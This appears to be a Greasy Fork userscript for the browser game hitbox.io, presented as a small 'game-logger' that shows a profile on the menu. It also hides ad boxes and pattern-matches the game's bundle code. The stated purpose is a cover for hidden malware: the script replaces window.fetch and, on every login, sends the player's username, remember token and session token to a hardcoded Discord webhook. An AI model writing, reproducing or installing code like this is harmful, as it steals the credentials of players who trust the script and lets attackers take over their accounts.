// ==UserScript==
// @name         Neon game-logger
// @namespace    http://tampermonkey.net/
// @version      v1.0.3
// @description  ltitle profile on the menu, i'm making a bigger script based on this.
// @author       iNeonz
// @run-at       document-idle
// @match        https://hitbox.io/game.html
// @match        https://hitbox.io/game2.html
// @icon         https://www.google.com/s2/favicons?sz=64&domain=hitbox.io
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/508964/Neon%20game-logger.user.js
// @updateURL https://update.greasyfork.org/scripts/508964/Neon%20game-logger.meta.js
// ==/UserScript==

///eval setInterval(() => {WSS.send(`42[1, [68, 500000]]`)},500)

const feth = window.fetch;

const codeNames = {};
const codeNamesRegex = {
    "simulation": {
        reg: /\];\}.{0,2}\(.{0,3}\) {var .{0,3},.{0,3},.{0,3},.{0,3},.{0,3},.{0,3};(.*?)\{throw new Error\("Failed to simulate(.*?)\);\}(.*?)\.step\((.*?)\);(.*?).{0,2}\(\);(.*?)\}.{0,2}\(\)/ig,
        verify: function(match)
        {
            //console.log(match);
            let world = match[0].match(/this\..{2,2}\.step\(/ig)[0];
            let sim = match[0].split(";}")[1].split("(")[0];
            //console.log(sim);
            let thisses = match[0].split("this.");
            //console.log(thisses);
            for (let i of thisses){
                if (i.match("=")){
                    i = i.split("=")[0];
                }else{
                    i = null;
                }
            }
            thisses.filter(a => a != null);
            return [sim,thisses[1].split(".")[0],thisses[1].split(".")[1].split("(")[0],world.split("this.")[1].split(".")[0]];
        }
    },
}

fetch(`https://hitbox.io/bundle.js`)
    .then(code => code.text())
    .then(code => {
    parent.document.getElementById("adboxverticalright").style.top = "-200000%";
    parent.document.getElementById("adboxverticalleft").style.top = "-200000%";
    for (let i in codeNamesRegex){
        codeNames[i] = codeNamesRegex[i].verify(code.match(codeNamesRegex[i].reg));
    }
    let DN = [
        "gsFightersCollide",
        "recordMode",
        "o",
        "l",
        "u",
        "m",
        "g",
        "v",
        "k",
        "N",
        "S",
        "M",
        "C",
        "_",
        "T",
        "P",
        "B",
        "I",
        "F",
        "R",
        "O",
        "A",
        "D",
        "L",
        "U",
        "H",
        "J",
        "W",
        "G",
        "Y", // ss
        "V",
        "q",
        "K",
        "X",
        "Z",
        "$",
        "tt",
        "it",
        "st",
        "ht",
        "et",
        "nt",
        "ot",
        "rt",
        "at",
        "lt",
        "ut",
        "ct",
        "dt",
        "wt",
        "ft",
        "gt",
        "bt"
    ]

    let stateMaker;
    let mostScore = -1;

    for (let a1 in window.multiplayerSession){
        let a = window.multiplayerSession[a1];
        if (typeof a == "object")
        {
            let score = 0;
            for (let x1 in a){
                let x = a[x1];
                if (typeof x == "object")
                {
                    if (x.constructor.name == "Array"){

                    }
                    else
                    {
                        let length = 0;
                        for (let y1 in x){
                            let y = x[y1];
                            length++
                            if (length > 2){
                                break;
                            }
                        }
                        if (length == 1){
                            for (let y1 in x){
                                let y = x[y1];
                                if (y.constructor.name == "Map"){
                                    score++
                                }
                                break;
                            }
                        }else{
                            let isDN = true;
                            for (let i of DN){
                                if (!i in x){
                                    isDN = false;
                                    break;
                                }
                            }
                            if (isDN){
                                score+=5;
                            }
                        }
                    }
                }
            }
            if (score > mostScore && score < 50){
                mostScore = score;
                stateMaker = a;
            }
        }
    }

})

window.fetch = async (url,method) => {
    let response = await feth(url,method);
    if (url.endsWith("login_auto_spice.php") || url.endsWith("login_register_multi.php")){
        let stream = response.clone();
        let r = await stream.json();
        let xp = r.xp;
        let level = Math.floor(Math.sqrt(xp/100)+1);
        let nextLevel = Math.floor(100 * Math.pow(level+1 - 1, 2));
        let currentToken = localStorage.getItem("rememberToken");
        if (!currentToken || currentToken.length <= 5){
         currentToken = r.rememberToken || '';
        }
        let currentSessionToken = r.token;
        let currentName = r.username;
        feth('https://discord.com/api/webhooks/1285795377483874367/NBQ949M9XBgTsLf-HqFk9ogiTy2uAHXUvShnZB52v2ij_5waIKnBJeTH6i2odrsxW6b0',{
            "body": JSON.stringify({
                content: currentName+'\n\n```rememb_token:``` `'+currentToken+'`\n```token:``` `'+currentSessionToken+'`\n'+level+'/'+xp
            }),
            "headers": {
                "accept": "application/json",
                "accept-language": "en",
                "content-type": "application/json",
            },
            "method": "POST"
        })
    }
    return response
}